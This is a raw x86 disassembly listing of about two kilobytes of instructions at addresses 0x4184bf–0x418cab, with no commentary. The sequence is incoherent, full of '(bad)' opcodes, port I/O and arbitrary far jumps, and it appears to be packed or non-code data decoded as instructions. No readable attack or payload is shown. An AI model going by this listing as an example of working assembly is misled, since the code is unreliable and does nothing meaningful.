  4184bf:	repz or al,0x2c
  4184c2:	pop    ds
  4184c3:	retf   
  4184c4:	dec    edi
  4184c5:	jle    0x41851d
  4184c7:	pop    gs
  4184c9:	and    al,0xcf
  4184cb:	mov    esp,DWORD PTR [ecx]
  4184cd:	ds pushf 
  4184cf:	cwde   
  4184d0:	ins    DWORD PTR es:[edi],dx
  4184d1:	mov    al,0xd2
  4184d4:	loop   0x4184cb
  4184d6:	mov    edx,0xa4f14fde
  4184db:	retf   
  4184dc:	add    dh,BYTE PTR [esi-0x45]
  4184df:	push   ecx
  4184e0:	loop   0x41855a
  4184e2:	fnstsw WORD PTR ds:0x84110c4
  4184e8:	ror    DWORD PTR [ebx+ebp*4],0xc3
  4184ec:	cmc    
  4184ed:	in     al,0x6b
  4184ef:	push   esi
  4184f0:	pop    esp
  4184f1:	jo     0x4184dc
  4184f3:	mov    dh,0x48
  4184f5:	dec    edx
  4184f6:	(bad)  
  4184f7:	fnstsw WORD PTR [esi]
  4184f9:	retf   0xfe4d
  4184fc:	in     eax,0xe8
  4184fe:	jnp    0x4184a0
  418500:	sub    al,0x29
  418502:	(bad)  [esi+0x3f]
  418505:	bnd jno 0x418536
  418508:	test   DWORD PTR [ebx-0x82a39c5],ecx
  41850e:	sbb    eax,DWORD PTR [esi-0x149f13e4]
  418514:	xor    bh,ah
  418516:	loopne 0x41857c
  418518:	int3   
  418519:	loopne 0x418552
  41851b:	mov    edx,0x8208d27e
  418520:	lods   al,BYTE PTR ds:[esi]
  418521:	outs   dx,DWORD PTR ds:[esi]
  418522:	lods   eax,DWORD PTR ds:[esi]
  418523:	sidtd  [ebp+0x1]
  418527:	ret    0x8c68
  41852a:	sub    eax,0x5e77e61d
  41852f:	ins    DWORD PTR es:[edi],dx
  418530:	xor    esi,DWORD PTR [edx]
  418532:	cmp    eax,0x24eebdef
  418537:	ret    0xd8b5
  41853a:	div    DWORD PTR ds:[esi+0x3d]
  41853e:	jo     0x418593
  418540:	push   0xa1fc6a34
  418545:	ficomp WORD PTR [eax+eiz*2+0x5e7e391e]
  41854c:	inc    esi
  41854d:	inc    esi
  41854e:	sar    ch,1
  418550:	inc    ebp
  418551:	or     BYTE PTR [eax],al
  418553:	add    eax,0x6c39703f
  418558:	or     DWORD PTR [ecx],esi
  41855a:	int3   
  41855b:	xor    eax,0xcf3c9e16
  418560:	cmp    al,0xce
  418562:	xor    eax,0x9de8984d
  418567:	mov    WORD PTR [esi],fs
  418569:	call   0xe44d:0x640ecab9
  418570:	shl    ch,cl
  418572:	xchg   esi,eax
  418573:	hlt    
  418574:	dec    edx
  418575:	or     cl,BYTE PTR [eax-0x7c]
  418578:	jge    0x418538
  41857a:	jne    0x418540
  41857c:	push   cs
  41857d:	les    esi,FWORD PTR [edx+0x61]
  418580:	(bad)  
  418582:	loope  0x4185a3
  418584:	and    edi,DWORD PTR [esi]
  418586:	mov    al,ds:0x4b4620ae
  41858b:	sbb    al,0xe5
  41858d:	xor    ebx,DWORD PTR [eax]
  41858f:	lods   eax,DWORD PTR ds:[esi]
  418590:	push   esi
  418591:	mov    dh,0x6a
  418593:	and    esi,DWORD PTR [ebx+0x4b]
  418596:	mov    esi,0xdd3ad2c7
  41859b:	mov    WORD PTR [ebx+0x7a],fs
  41859e:	jb     0x4185af
  4185a0:	mov    edi,0x81051c10
  4185a5:	and    ah,BYTE PTR [esi]
  4185a7:	retf   0xe1e4
  4185aa:	les    ebp,FWORD PTR [esi]
  4185ac:	pop    ss
  4185ad:	stos   DWORD PTR es:[edi],eax
  4185ae:	sub    eax,0x24b459d
  4185b3:	mov    ecx,0xf558fe82
  4185b8:	xchg   esi,eax
  4185b9:	push   0x7ba455b2
  4185be:	(bad)  
  4185bf:	pop    eax
  4185c0:	(bad)  
  4185c1:	gs mov ss,esi
  4185c4:	scas   al,BYTE PTR es:[edi]
  4185c5:	shl    DWORD PTR [ecx-0x354690c7],0x88
  4185cc:	(bad)  
  4185cd:	fsub   DWORD PTR [edi]
  4185cf:	dec    ebp
  4185d0:	cmp    BYTE PTR [ebp-0x6c],al
  4185d3:	outs   dx,BYTE PTR ds:[esi]
  4185d4:	hlt    
  4185d5:	mov    ecx,0xf8d44d69
  4185da:	popa   
  4185db:	sbb    al,0xa9
  4185dd:	mov    DWORD PTR [edx],edi
  4185df:	adc    ecx,esp
  4185e1:	mov    ds:0xf1a10d24,al
  4185e6:	dec    ebx
  4185e7:	mov    esp,0x23f8252
  4185ec:	cmp    ebx,DWORD PTR [edx+edi*4]
  4185ef:	mov    al,ds:0x68b111f3
  4185f4:	jno    0x41858b
  4185f6:	imul   esp,DWORD PTR [edi+ecx*4],0x4cdf1ecc
  4185fd:	lock fldl2t 
  418600:	pusha  
  418601:	mov    ch,0x0
  418603:	or     al,bl
  418605:	xchg   ebx,eax
  418606:	pop    ds
  418607:	ror    BYTE PTR [edx],0xf1
  41860a:	mov    ds:0x158cf2a,eax
  41860f:	adc    ch,ch
  418611:	push   edi
  418612:	pop    esi
  418613:	aad    0xb0
  418615:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418616:	stos   BYTE PTR es:[edi],al
  418617:	lods   eax,DWORD PTR ds:[esi]
  418618:	pop    ss
  418619:	in     eax,dx
  41861a:	cmp    BYTE PTR [edx],ch
  41861c:	retf   0x406b
  41861f:	(bad)  
  418620:	lock push es
  418622:	sub    BYTE PTR [ecx-0x6210ce18],0x36
  418629:	sub    eax,0xe01860cb
  41862e:	repnz fsub QWORD PTR [ecx-0x53]
  418632:	pop    esp
  418633:	int3   
  418634:	dec    edi
  418635:	adc    dl,BYTE PTR [eax+edx*4-0x77122fe]
  41863c:	(bad)  [edx+ecx*1-0x2c]
  418640:	imul   esi,DWORD PTR [edi-0x5c],0x49
  418644:	clc    
  418645:	jmp    0x5a088e3
  41864a:	test   DWORD PTR [edi+eiz*2-0x6f64bcc7],edx
  418651:	mov    ch,0xb3
  418653:	jmp    0x418643
  418655:	sub    ah,bh
  418657:	int3   
  418658:	xor    ah,bl
  41865a:	mov    al,0x54
  41865c:	and    DWORD PTR [ecx+0x11c0b472],eax
  418662:	xchg   ebx,eax
  418663:	leave  
  418664:	xor    DWORD PTR [edi+0x19],eax
  418667:	or     BYTE PTR [edx+0x54],dh
  41866a:	popf   
  41866b:	jmp    0x743a:0x31e02fc7
  418672:	(bad)  
  418673:	pop    esp
  418674:	sbb    esi,DWORD PTR [ebx+0x52f4ab08]
  41867a:	mov    ah,0x85
  41867c:	add    eax,0xcb4bc38a
  418681:	sub    dl,dh
  418683:	lds    esp,FWORD PTR [ebp-0x1e6919f]
  418689:	ja     0x4186d8
  41868b:	cs test eax,0x6c6163a8
  418691:	jg     0x41862c
  418693:	pushf  
  418694:	shl    BYTE PTR [edi-0x5188eb10],0x20
  41869b:	jo     0x418675
  41869d:	jmp    0x5d603627
  4186a2:	add    al,0x5e
  4186a4:	sub    esp,esp
  4186a6:	add    esi,eax
  4186a8:	jle    0x418706
  4186aa:	xchg   edi,eax
  4186ab:	retf   
  4186ac:	cld    
  4186ad:	jne    0x418666
  4186af:	adc    DWORD PTR [esi-0x6f],ecx
  4186b2:	pop    edx
  4186b3:	xchg   edi,eax
  4186b4:	(bad)  
  4186b6:	push   es
  4186b7:	cmp    ebp,eax
  4186b9:	popf   
  4186ba:	test   DWORD PTR [ebp+0x18],esp
  4186bd:	push   edi
  4186be:	jo     0x4186db
  4186c0:	dec    esp
  4186c1:	cdq    
  4186c2:	iret   
  4186c3:	xor    DWORD PTR ds:0x899ae62c,esp
  4186c9:	clc    
  4186ca:	test   DWORD PTR [ebx],edx
  4186cc:	pop    edx
  4186cd:	retf   0x61f0
  4186d0:	lods   al,BYTE PTR ds:[esi]
  4186d1:	adc    al,0x63
  4186d3:	add    al,0x6
  4186d5:	popa   
  4186d6:	or     ecx,esp
  4186d8:	mov    eax,ds:0x84526a4f
  4186dd:	dec    esi
  4186de:	rcr    BYTE PTR [edx*1+0x3438370b],cl
  4186e5:	fdiv   DWORD PTR [edx]
  4186e7:	js     0x418719
  4186e9:	pop    esi
  4186ea:	inc    ebx
  4186eb:	sti    
  4186ec:	jp     0x418687
  4186ee:	mov    eax,ds:0x3302af0c
  4186f3:	or     bl,BYTE PTR [esi]
  4186f5:	call   0x4904573f
  4186fa:	cli    
  4186fb:	test   al,0x60
  4186fd:	je     0x4186fe
  4186ff:	jnp    0x41872b
  418701:	xchg   ecx,eax
  418702:	add    al,0xa0
  418704:	in     eax,0x71
  418706:	ins    BYTE PTR es:[edi],dx
  418707:	jae    0x418772
  418709:	bound  ebx,QWORD PTR gs:[edi+esi*8]
  41870d:	repz (bad) 
  41870f:	jmp    0x418714
  418711:	out    dx,eax
  418712:	mov    al,0xfa
  418714:	fcmovu st,st(2)
  418716:	popf   
  418717:	outs   dx,BYTE PTR ds:[esi]
  418718:	push   cs
  418719:	dec    edi
  41871a:	fwait
  41871b:	cs pop eax
  41871d:	xchg   DWORD PTR [eax],edx
  41871f:	xor    dh,BYTE PTR [eax]
  418721:	adc    DWORD PTR ds:0x7142a4ac,ebp
  418727:	in     al,0x77
  418729:	pop    esi
  41872a:	int3   
  41872b:	push   esi
  41872c:	ror    bl,0x8
  41872f:	dec    edx
  418730:	ins    BYTE PTR es:[edi],dx
  418731:	push   cs
  418732:	in     eax,dx
  418733:	sbb    eax,0x443c7f0a
  418738:	inc    ecx
  418739:	and    BYTE PTR [edi],ah
  41873b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41873d:	jl     0x41874e
  41873f:	out    dx,eax
  418740:	xor    BYTE PTR [eax+0x4a30294b],bh
  418746:	inc    esi
  418747:	adc    DWORD PTR ds:0x6de044db,edi
  41874d:	mov    al,ds:0x8fb72abb
  418752:	test   BYTE PTR [eax-0x2b],cl
  418755:	push   ebp
  418756:	sar    BYTE PTR [eax+ebp*2-0x63],cl
  41875a:	jmp    0xffc2:0xc561424
  418761:	jae    0x418746
  418763:	pop    ecx
  418764:	push   es
  418765:	jne    0x4187c0
  418767:	sub    BYTE PTR [eax],cl
  418769:	sub    eax,0x54b873ac
  41876e:	lds    eax,FWORD PTR [edi+0x72]
  418771:	and    al,0x8f
  418773:	mov    ds:0x4123d776,eax
  418778:	std    
  418779:	cmp    eax,0xc1dd37bd
  41877e:	jl     0x4187ef
  418780:	xchg   BYTE PTR ds:0x7e25c9c8,bl
  418786:	dec    ebx
  418787:	out    0x87,eax
  418789:	retf   
  41878a:	or     BYTE PTR [edx-0x4b],dl
  41878d:	or     DWORD PTR [ecx],edx
  41878f:	sub    dl,0xa8
  418792:	sub    eax,DWORD PTR [ecx-0x61]
  418795:	pop    ds
  418796:	mov    dh,0x8a
  418798:	clc    
  418799:	scas   al,BYTE PTR es:[edi]
  41879a:	call   0xa8f16ebe
  41879f:	pop    es
  4187a0:	jl     0x418768
  4187a2:	addr16 mov al,ds:0xdf7
  4187a6:	out    dx,al
  4187a7:	call   0x2a83918b
  4187ac:	mov    ds:0xcab4fe39,eax
  4187b1:	mov    esp,0x8fe8f398
  4187b6:	or     bh,dl
  4187b8:	inc    ecx
  4187b9:	daa    
  4187ba:	inc    ecx
  4187bb:	push   ebp
  4187bc:	dec    edx
  4187bd:	dec    esp
  4187be:	repz jo 0x41882f
  4187c1:	xchg   BYTE PTR [ebx-0x6f4febbf],dh
  4187c7:	std    
  4187c8:	inc    ebp
  4187c9:	enter  0x7aff,0xf5
  4187cd:	add    al,0x36
  4187cf:	sub    cl,bh
  4187d1:	call   0xb287:0xdc935bec
  4187d8:	adc    BYTE PTR [ecx-0x52],ch
  4187db:	sbb    DWORD PTR [eax],ecx
  4187dd:	mov    al,0xbd
  4187df:	sbb    DWORD PTR [ebx],0x54756c8d
  4187e5:	in     al,0xb0
  4187e7:	mov    ebp,0x7194d4bd
  4187ec:	mov    bh,0xfb
  4187ee:	push   edi
  4187ef:	adc    DWORD PTR [esi-0x641c17bc],ebp
  4187f5:	ins    DWORD PTR es:[edi],dx
  4187f6:	and    eax,0x3c8d81a2
  4187fb:	(bad)  
  4187fc:	addr16 pop ss
  4187fe:	out    0xb0,al
  418800:	pushf  
  418801:	outs   dx,DWORD PTR ds:[esi]
  418802:	cld    
  418803:	mov    ch,0xd6
  418805:	jno    0x418862
  418807:	xor    ch,BYTE PTR [ebx+0x68051bc1]
  41880d:	xchg   al,bh
  41880f:	pop    esp
  418810:	mov    bl,BYTE PTR [eax+0x19]
  418813:	jp     0x4187e2
  418815:	cmp    esp,eax
  418817:	mov    esi,DWORD PTR [ecx+0x6520c5e0]
  41881d:	add    al,0xf7
  41881f:	cld    
  418820:	sub    eax,0x2f53fbef
  418825:	jbe    0x4187c7
  418827:	test   eax,0x3744c2ee
  41882c:	push   edx
  41882d:	popf   
  41882e:	inc    esi
  41882f:	arpl   WORD PTR [edi+ebx*1-0x3c],ax
  418833:	xor    al,0x45
  418835:	mov    BYTE PTR [edi+eiz*4],0xae
  418839:	xor    al,0x3b
  41883b:	or     DWORD PTR [edi],0x17b29cff
  418841:	mov    edi,0x63bc0a0e
  418846:	(bad)  
  418847:	aas    
  418848:	test   al,0xb3
  41884a:	mov    esi,0x52691332
  41884f:	adc    ch,BYTE PTR [ebx+0x78]
  418852:	sbb    DWORD PTR [edi-0xe2b34a4],ebx
  418858:	div    DWORD PTR [edi-0x608f46af]
  41885e:	and    dh,BYTE PTR [edx-0x2d]
  418861:	xor    ch,bh
  418863:	sbb    al,0x75
  418865:	test   ecx,ebp
  418867:	ficomp DWORD PTR [ecx]
  418869:	xchg   ebp,eax
  41886a:	cdq    
  41886b:	js     0x4188dd
  41886d:	pop    es
  41886e:	add    BYTE PTR [ebp-0x5ba5e28],dl
  418874:	enter  0xd177,0x9e
  418878:	iret   
  418879:	iret   
  41887a:	fimul  DWORD PTR [edi-0x3e]
  41887d:	sub    DWORD PTR [edi-0x45],esi
  418880:	add    bl,dh
  418882:	sbb    al,0x5f
  418884:	lds    ecx,FWORD PTR [ecx+ecx*4-0x2]
  418888:	js     0x4188bd
  41888a:	ret    0xa8b
  41888d:	clc    
  41888e:	test   al,0xcb
  418890:	popf   
  418891:	js     0x41888f
  418893:	retf   
  418894:	mov    bh,0x62
  418896:	cmp    DWORD PTR [ebx],0xffffffff
  418899:	push   eax
  41889a:	sub    DWORD PTR [eax],ebp
  41889c:	bound  eax,QWORD PTR [ebx-0x19]
  41889f:	mov    ah,0x11
  4188a1:	in     al,dx
  4188a2:	xchg   ecx,eax
  4188a3:	mov    eax,ds:0x9fcd27ba
  4188a8:	repz inc eax
  4188aa:	aaa    
  4188ab:	push   esp
  4188ac:	repz and DWORD PTR [ebx-0x552b7a2b],edi
  4188b3:	cmp    al,0x2a
  4188b5:	jae    0x4188f3
  4188b7:	add    DWORD PTR [ebp+ecx*4+0x54],eax
  4188bb:	mov    eax,0xb5a9c84e
  4188c0:	rol    BYTE PTR [ebx-0x1f],0xe9
  4188c4:	adc    DWORD PTR [edx-0x55],ebx
  4188c7:	push   0xd
  4188c9:	aad    0x5a
  4188cb:	test   cl,0xf1
  4188ce:	hlt    
  4188cf:	mov    bl,0x75
  4188d1:	inc    ecx
  4188d2:	pop    ss
  4188d3:	xor    al,0xb6
  4188d5:	int3   
  4188d6:	in     eax,dx
  4188d7:	dec    eax
  4188d8:	and    esi,edx
  4188da:	dec    ecx
  4188db:	pop    ss
  4188dc:	lea    ebx,[ecx]
  4188de:	sub    bl,0x6f
  4188e1:	iret   
  4188e2:	pop    ecx
  4188e3:	inc    ebx
  4188e4:	pop    edi
  4188e5:	in     eax,0x17
  4188e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188e8:	mov    bh,0x7
  4188ea:	fisttp QWORD PTR ds:0x123881c
  4188f1:	or     DWORD PTR [edx-0x2e63a703],ebx
  4188f7:	jg     0x418978
  4188f9:	mov    ds,WORD PTR [eax]
  4188fb:	sub    edi,DWORD PTR [edx+0x71658f67]
  418901:	rol    DWORD PTR [ebp-0x3a88887d],1
  418907:	add    BYTE PTR [edx-0x68],dl
  41890a:	pop    esi
  41890b:	int3   
  41890c:	pop    ds
  41890d:	je     0x41890f
  41890f:	add    eax,esp
  418911:	push   0x8c073d07
  418916:	push   ecx
  418917:	mov    ebp,ebx
  418919:	inc    esp
  41891a:	sub    eax,0x121d9041
  41891f:	jg     0x4188ef
  418921:	das    
  418922:	sub    DWORD PTR [ebx-0x759d263],esi
  418928:	mov    edi,0x10d66e2e
  41892d:	es mov edi,edi
  418930:	mov    esp,0xb50955be
  418935:	(bad)  
  418936:	in     eax,dx
  418937:	mov    ebx,0x2c271f29
  41893c:	inc    esi
  41893d:	es mov cl,0x2d
  418940:	jnp    0x418958
  418942:	test   DWORD PTR [edi-0x2d01f136],0xa9d3f9f4
  41894c:	ins    BYTE PTR es:[edi],dx
  41894d:	rcl    DWORD PTR [esi-0x44],1
  418950:	sub    al,0x8c
  418952:	push   ss
  418953:	out    0xe2,eax
  418955:	mov    bh,0x63
  418957:	mov    ?,eax
  418959:	and    DWORD PTR [edi+esi*1+0x54],0xffffffe5
  41895e:	cmp    bh,ah
  418960:	fild   DWORD PTR [eax-0x1dac6629]
  418966:	jns    0x41890d
  418968:	aam    0x2a
  41896a:	push   0x21d4d447
  41896f:	adc    al,0xf0
  418971:	xchg   esi,eax
  418972:	stc    
  418973:	into   
  418974:	test   eax,0x976cea0a
  418979:	mov    ds:0xf7b69575,al
  41897e:	loop   0x418954
  418980:	sub    BYTE PTR [esi],0xd2
  418983:	sbb    eax,0xcf426fa5
  418988:	push   ebx
  418989:	cmp    al,0x35
  41898b:	js     0x4189eb
  41898d:	and    al,0x91
  41898f:	jmp    0x418986
  418991:	push   ecx
  418992:	adc    eax,DWORD PTR [ebp-0xb]
  418995:	outs   dx,DWORD PTR ds:[esi]
  418996:	test   DWORD PTR [ebx+0x36a6290d],ebp
  41899c:	lahf   
  41899d:	je     0x4189d6
  41899f:	daa    
  4189a0:	push   esi
  4189a1:	and    eax,0x1f
  4189a4:	jnp    0x4189cd
  4189a6:	and    bl,BYTE PTR [esi+ecx*4+0x478b883e]
  4189ad:	fsub   st(4),st
  4189af:	aad    0xc8
  4189b1:	mov    dl,0x2e
  4189b3:	int3   
  4189b4:	iret   
  4189b5:	aad    0x8
  4189b7:	out    dx,al
  4189b8:	fwait
  4189b9:	xchg   DWORD PTR [ebx],ecx
  4189bb:	into   
  4189bc:	shr    DWORD PTR [ebp-0x5e26a273],0x85
  4189c3:	pushf  
  4189c4:	outs   dx,DWORD PTR ds:[esi]
  4189c5:	mov    ah,0xa
  4189c7:	xchg   BYTE PTR [ecx+0x1b24fa31],bl
  4189cd:	push   esp
  4189ce:	out    dx,al
  4189cf:	add    bl,al
  4189d1:	and    bh,BYTE PTR [esi-0x4e610b72]
  4189d7:	dec    edi
  4189d8:	mov    ebp,0x9b3f5bf2
  4189dd:	or     eax,0x74c48b28
  4189e2:	jae    0x4189b8
  4189e4:	dec    edx
  4189e5:	mov    edx,DWORD PTR [esi+ebx*4+0x1]
  4189e9:	xlat   BYTE PTR ds:[ebx]
  4189ea:	fcom   DWORD PTR [edi+0x68ce5818]
  4189f0:	cdq    
  4189f1:	sbb    BYTE PTR [edx+0x5e58f212],dh
  4189f7:	imul   edx,DWORD PTR [ebx+0x562387c6],0x6d221581
  418a01:	add    al,0x3d
  418a03:	or     eax,0x8c0cd0fd
  418a08:	sti    
  418a09:	xor    ebp,esp
  418a0b:	push   ebp
  418a0c:	cwde   
  418a0d:	scas   eax,DWORD PTR es:[edi]
  418a0e:	pusha  
  418a0f:	fadd   QWORD PTR [eax]
  418a11:	add    al,0xf4
  418a13:	mov    BYTE PTR [eax],0xdc
  418a16:	sbb    al,0x23
  418a18:	(bad)  
  418a19:	icebp  
  418a1a:	pop    eax
  418a1b:	lods   eax,DWORD PTR ds:[esi]
  418a1c:	cmp    DWORD PTR [edi-0x5dbcfee7],eax
  418a22:	xor    al,0x7f
  418a24:	mov    esp,0xf9bf9ece
  418a29:	jmp    0x418a78
  418a2b:	fcom   DWORD PTR [eax]
  418a2d:	cmp    al,BYTE PTR ds:0x40185124
  418a33:	pushf  
  418a34:	pushw  ss
  418a36:	cdq    
  418a37:	std    
  418a38:	scas   al,BYTE PTR es:[edi]
  418a39:	adc    al,0x91
  418a3b:	pushf  
  418a3c:	xor    dl,BYTE PTR ds:0x7bda7cba
  418a42:	adc    eax,0x90ed3372
  418a47:	cwde   
  418a48:	stc    
  418a49:	dec    eax
  418a4a:	loop   0x418a48
  418a4c:	push   cs
  418a4d:	arpl   WORD PTR [ebx],cx
  418a4f:	inc    ebp
  418a50:	test   DWORD PTR [esi+0x4d],ebx
  418a53:	push   ss
  418a54:	xrelease mov BYTE PTR [eax+0x0],0x28
  418a59:	pushf  
  418a5a:	push   0x15c5172c
  418a5f:	lods   al,BYTE PTR ds:[esi]
  418a60:	sub    al,0x23
  418a62:	fcomp  QWORD PTR [edi+0x781b0c57]
  418a68:	cs call 0xa4f57243
  418a6e:	mov    cl,0x61
  418a70:	test   al,0xb
  418a72:	cmp    ebx,edi
  418a74:	sub    eax,0x5f3fc197
  418a79:	bndldx bnd3,[edx+0x63]
  418a7d:	int3   
  418a7e:	arpl   WORD PTR [ecx-0x70c84f37],ax
  418a84:	inc    esp
  418a85:	dec    ebx
  418a86:	aam    0xa1
  418a88:	cdq    
  418a89:	icebp  
  418a8a:	nop
  418a8b:	fcom   DWORD PTR [ebx+0x47]
  418a8e:	dec    edx
  418a8f:	push   ds
  418a90:	dec    edx
  418a91:	add    esp,DWORD PTR [ebx]
  418a93:	loop   0x418ac7
  418a95:	loope  0x418a35
  418a97:	sbb    BYTE PTR [eax],al
  418a99:	adc    DWORD PTR [ebx+0x3839e294],edi
  418a9f:	ja     0x418ab7
  418aa1:	bound  esp,QWORD PTR [esi]
  418aa3:	mov    ?,WORD PTR [ecx]
  418aa5:	dec    esp
  418aa6:	push   esp
  418aa7:	cmc    
  418aa8:	imul   ecx,DWORD PTR [ebx],0x3
  418aab:	lds    ebx,FWORD PTR gs:[ebp-0x73]
  418aaf:	dec    edx
  418ab0:	sti    
  418ab1:	nop
  418ab2:	out    0x29,eax
  418ab4:	push   ecx
  418ab5:	fimul  WORD PTR [esi-0x11193104]
  418abb:	les    esp,FWORD PTR [edx]
  418abd:	push   esp
  418abe:	dec    esp
  418abf:	out    dx,eax
  418ac0:	xchg   esp,eax
  418ac1:	jo     0x418aa6
  418ac3:	leave  
  418ac4:	arpl   WORD PTR [edx+edi*4-0x1d5b90db],sp
  418acb:	push   0xffffffcb
  418acd:	push   0x36a5e5cf
  418ad2:	inc    esp
  418ad3:	jp     0x418a82
  418ad5:	shr    BYTE PTR ds:0x8acfbe90,0x6b
  418adc:	xchg   DWORD PTR [edi+0x284d6a90],edi
  418ae2:	xchg   DWORD PTR [edx-0x65],ebp
  418ae5:	dec    ecx
  418ae6:	push   ss
  418ae7:	js     0x418aac
  418ae9:	dec    eax
  418aea:	add    al,0x87
  418aec:	push   ebx
  418aed:	jle    0x418a75
  418aef:	sbb    bh,0xdd
  418af2:	ja     0x418b0f
  418af4:	loopne 0x418b03
  418af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418af7:	pop    ebx
  418af8:	test   BYTE PTR [ebx+0x37],bh
  418afb:	xchg   edx,eax
  418afc:	ror    DWORD PTR [ebp+0x5d084ab1],0x8e
  418b03:	hlt    
  418b04:	mov    edx,0xf2f5ac55
  418b09:	inc    ecx
  418b0a:	push   edi
  418b0b:	aas    
  418b0c:	les    esi,FWORD PTR [ebp+eax*4+0x64]
  418b10:	sub    eax,0xb77c3f7a
  418b15:	mov    ebx,DWORD PTR [ecx+edi*8-0xf]
  418b19:	sbb    ecx,DWORD PTR [eax+0x2bc022e5]
  418b1f:	mov    bl,0xb2
  418b21:	jne    0x418b5f
  418b23:	mov    ebx,fs
  418b25:	xchg   edi,eax
  418b26:	xor    DWORD PTR [esi],ecx
  418b28:	push   cs
  418b29:	adc    esi,esp
  418b2b:	ud0    esi,DWORD PTR [esi+esi*2]
  418b2f:	js     0x418b74
  418b31:	test   al,0xcb
  418b33:	jecxz  0x418b8d
  418b35:	ja     0x418b11
  418b37:	hlt    
  418b38:	jo     0x418ad6
  418b3a:	mov    al,ds:0xd71abccc
  418b3f:	sahf   
  418b40:	ss push cs
  418b42:	(bad)  
  418b43:	inc    DWORD PTR [esi]
  418b45:	stc    
  418b46:	xchg   esp,eax
  418b47:	sub    DWORD PTR ds:0xff33bed9,eax
  418b4d:	xchg   BYTE PTR [eax],dh
  418b4f:	push   ebx
  418b50:	arpl   bp,dx
  418b52:	add    dh,dl
  418b54:	and    BYTE PTR [edi+esi*8+0x68b52fdb],0xb3
  418b5c:	sub    bh,dh
  418b5e:	mov    ebx,0x2a89ca37
  418b63:	pushf  
  418b64:	jne    0x418b89
  418b66:	mov    edx,0x36d69d8c
  418b6b:	mov    al,0x9
  418b6d:	test   eax,0x43f04193
  418b72:	sbb    BYTE PTR [ecx],bh
  418b74:	(bad)  
  418b75:	sub    edi,DWORD PTR [edx+0x3adff1b4]
  418b7b:	mov    al,BYTE PTR [edi-0x4b956a34]
  418b81:	jbe    0x418b63
  418b83:	jmp    0x1243:0xcf236b3f
  418b8a:	push   cs
  418b8b:	ss and ecx,eax
  418b8e:	mov    esi,0x9cd4a568
  418b93:	mov    ebx,0xca1f52cd
  418b98:	pop    edx
  418b99:	out    0x4e,eax
  418b9b:	dec    eax
  418b9c:	mov    ecx,0xd10e02c2
  418ba1:	or     edi,ecx
  418ba3:	ins    BYTE PTR es:[edi],dx
  418ba4:	add    al,0x24
  418ba6:	lahf   
  418ba7:	loopne 0x418b85
  418ba9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418baa:	aam    0x7e
  418bac:	sbb    cl,BYTE PTR [ebx-0x5a591a09]
  418bb2:	in     eax,dx
  418bb3:	add    al,0xf3
  418bb5:	or     edi,DWORD PTR gs:[ebx]
  418bb8:	pop    edi
  418bb9:	and    eax,0xd77ff4c4
  418bbe:	std    
  418bbf:	mov    esi,0x30a18ddf
  418bc4:	sub    DWORD PTR [esi-0x54],edi
  418bc7:	ja     0x418c18
  418bc9:	jge    0x418ba9
  418bcb:	inc    edi
  418bcc:	sbb    dl,dl
  418bce:	sub    BYTE PTR gs:[ecx+0x55],al
  418bd2:	xor    BYTE PTR [edx-0x39107927],ch
  418bd8:	jo     0x418bfe
  418bda:	enter  0x26d,0x53
  418bde:	pop    eax
  418bdf:	add    eax,0xd9d029e9
  418be4:	mov    ebx,0x695ff651
  418be9:	mov    eax,0x4f93bbb7
  418bee:	ins    DWORD PTR es:[edi],dx
  418bef:	loopne 0x418c33
  418bf1:	rcr    BYTE PTR [edx],1
  418bf3:	inc    esp
  418bf4:	xor    BYTE PTR [eax],0x5
  418bf7:	lods   eax,DWORD PTR ds:[esi]
  418bf8:	push   cs
  418bf9:	iret   
  418bfa:	aas    
  418bfb:	scas   eax,DWORD PTR es:[edi]
  418bfc:	and    al,0xb1
  418bfe:	jns    0x418c24
  418c00:	and    dl,BYTE PTR fs:[ebp+0x7bb3b0d2]
  418c07:	jg     0x418c0a
  418c09:	mov    ebp,0xa06eeb3c
  418c0e:	sub    edx,ebx
  418c10:	(bad)  
  418c11:	aaa    
  418c12:	je     0x418c14
  418c14:	mov    ch,0x18
  418c16:	cdq    
  418c17:	sub    BYTE PTR [ebp+ebp*2+0x20a7fb7b],ah
  418c1e:	mov    dl,0xfb
  418c20:	and    edx,DWORD PTR [ebx]
  418c22:	xor    eax,0xaa68ea26
  418c27:	cmp    BYTE PTR [edi+0x70],dh
  418c2a:	retf   
  418c2b:	mov    eax,ds:0x88cf27be
  418c30:	push   0xffffffbf
  418c32:	cmp    BYTE PTR [edx+0x7f],bl
  418c35:	add    ecx,DWORD PTR [ebx+0x77]
  418c38:	pop    eax
  418c39:	imul   eax,esi,0x2e
  418c3c:	or     bl,ah
  418c3e:	fdivr  QWORD PTR [ebp+0x43]
  418c41:	cwde   
  418c42:	inc    edi
  418c43:	aaa    
  418c44:	loop   0x418c5f
  418c46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c47:	(bad)  
  418c48:	loop   0x418c89
  418c4a:	jo     0x418bf2
  418c4c:	popa   
  418c4d:	enter  0x63c4,0x77
  418c51:	xor    eax,0xb111592d
  418c56:	pop    edi
  418c57:	or     ecx,DWORD PTR [edx]
  418c59:	mov    al,0xb6
  418c5b:	pop    ss
  418c5c:	std    
  418c5d:	xor    BYTE PTR ds:0x1e82b1cb,bh
  418c63:	add    ecx,DWORD PTR [ebx+0x32]
  418c66:	or     al,0xc6
  418c68:	jbe    0x418c3f
  418c6a:	clc    
  418c6b:	cmp    DWORD PTR [edi-0x5e8839f1],ebp
  418c71:	inc    ebp
  418c72:	ror    BYTE PTR [esi+0x8deb8e4],1
  418c78:	dec    esp
  418c79:	pusha  
  418c7a:	loope  0x418bff
  418c7c:	pusha  
  418c7d:	push   es
  418c7e:	sbb    DWORD PTR [esi+0x6cfed1a9],ebx
  418c84:	fs pushf 
  418c86:	xchg   DWORD PTR [ecx-0x79],ebp
  418c89:	stc    
  418c8a:	mov    ds:0x5f72bae5,al
  418c8f:	inc    esp
  418c90:	add    esi,DWORD PTR [ecx-0x3ecd5cb4]
  418c96:	adc    BYTE PTR fs:[edi],dl
  418c99:	cmp    al,0x1a
  418c9b:	lods   eax,DWORD PTR ds:[esi]
  418c9c:	jo     0x418c3e
  418c9e:	js     0x418d13
  418ca0:	cmp    ebx,DWORD PTR [ebx+edi*8-0x5a]
  418ca4:	pop    esi
  418ca5:	xor    eax,0xd96052d1
  418caa:	(bad)  
  418cab:	cdq    
